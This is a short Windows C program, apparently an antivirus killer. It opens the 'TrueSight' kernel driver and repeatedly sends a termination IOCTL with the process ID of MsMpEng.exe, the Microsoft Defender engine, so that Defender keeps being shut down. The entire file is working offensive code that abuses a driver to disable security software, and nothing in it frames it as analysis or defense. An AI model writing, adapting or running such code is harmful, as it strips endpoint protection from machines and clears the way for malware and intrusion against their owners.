#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <tchar.h>

#define DRIVER_SYMLINK L"\\\\.\\TrueSight"
#define TERMINATE_IOCTL 0x22E044
#define WINDOWS_ENGINE TRUE

typedef struct _killerBuff {
	int PID;
} killerBuff, * pKillerBuff;

int EnumerateProcess(const wchar_t* ProcessName) {
	DWORD PID = 0;
	PROCESSENTRY32 pe32;
	HANDLE hSnapshot;
	int pid = -1;

	// Take a snapshot of all processes
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return -1;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Get the first process
	if (Process32First(hSnapshot, &pe32)) {
		do {
			// Compare process name (case-insensitive)
			char* filename = pe32.szExeFile;
			if (_wcsicmp((char*)pe32.szExeFile, ProcessName) == 0) {
				pid = pe32.th32ProcessID;
				break;
			}
		} while (Process32Next(hSnapshot, &pe32));
	}

	CloseHandle(hSnapshot);
	return pid;
}

int main(int argc, char* argv[]) {
	HANDLE hDriver = CreateFile(DRIVER_SYMLINK, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!hDriver || hDriver == 0xffffffffffffffff) {
		printf("Could not open handle to the Driver\n");
	}

	DWORD bytesReturned = 0;
	BYTE outBuffer[256];
	BOOL ioctl_result;
	while (1) {
		if (WINDOWS_ENGINE) {

			const wchar_t* targetProcess = L"MsMpEng.exe";
			DWORD PID = EnumerateProcess(targetProcess);
			BOOL ioctl_result;

			if (PID != -1) {
				killerBuff buff = { PID };
				ioctl_result = DeviceIoControl(hDriver, TERMINATE_IOCTL, &buff, sizeof(buff), &outBuffer, 256, &bytesReturned, NULL);
				if (ioctl_result) {
					printf("Must've Died\n");
				}
				else {
					printf("Something botched up\n");
				}
			}
			else {
				printf("No Defender Engine Found !\n");
			}
		}
		Sleep(1500);
	}
	return 0;
}